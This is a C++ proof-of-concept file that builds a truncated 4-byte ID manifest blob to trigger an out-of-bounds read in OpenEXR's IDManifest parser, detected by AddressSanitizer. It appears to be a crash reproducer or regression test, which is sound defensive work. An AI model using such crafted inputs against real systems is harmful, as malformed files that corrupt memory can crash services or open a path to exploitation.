// SPDX-License-Identifier: BSD-3-Clause
//
// Proof-of-concept: drive the public Imf::IDManifest parser with a crafted
// metadata blob.
//
// The blob below is a 4-byte ID manifest header claiming format version 1
// (integers are stored little-endian by Imf's Xdr layer). A version-1 header
// carries an additional 32-bit flags word immediately after the version
// field, so a 4-byte blob is truncated: a conforming parser must reject it
// cleanly (Iex::InputExc), not read past the end of the supplied buffer.
//
// On a correct library this throws and the program exits 0. With the defect
// present, the parser reads the missing flags word out of bounds and
// AddressSanitizer aborts inside OpenEXR.
//
// Entry point: Imf::IDManifest(const char* data, const char* end) from the
// public header ImfIDManifest.h -- the same constructor used to parse the
// idManifest attribute of an .exr file.

#include <ImfIDManifest.h>

#include <cstdio>
#include <new>

// Surface sanitizer reports as SIGABRT even when ASAN_OPTIONS is not set.
extern "C" const char*
__asan_default_options (void)
{
    return "abort_on_error=1:detect_leaks=0";
}

int
main (void)
{
    char* blob      = new char[4];
    blob[0] = 0x01; // version = 1, little-endian
    blob[1] = 0x00;
    blob[2] = 0x00;
    blob[3] = 0x00;

    try
    {
        Imf::IDManifest manifest (blob, blob + 4);
        (void) manifest;
    }
    catch (...)
    {
        // a truncated manifest must be rejected with an exception
    }

    delete[] blob;
    std::puts ("probe finished");
    return 0;
}
